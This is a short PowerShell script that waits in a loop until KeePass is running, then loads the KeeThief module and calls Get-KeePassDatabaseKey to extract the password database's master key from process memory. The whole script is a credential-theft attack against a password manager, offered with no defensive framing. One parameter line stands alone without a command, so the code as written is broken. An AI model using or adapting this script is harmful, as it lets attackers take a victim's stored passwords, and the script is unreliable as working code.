while ($true) 
{ 
  If((Get-Process -Name KeePass -ErrorAction SilentlyContinue )) 
  { 
        Import-Module KeeThief.ps1 
        -ProcessName KeePass -FilePath "C:\Program Files (x86)\KeePass Password Safe 2\" 
        Get-KeePassDatabaseKey -Verbose 
        Start-Sleep -Seconds 1000 
  } 
  Else 
  { 
    Start-Sleep -Seconds 5 
  } 
}
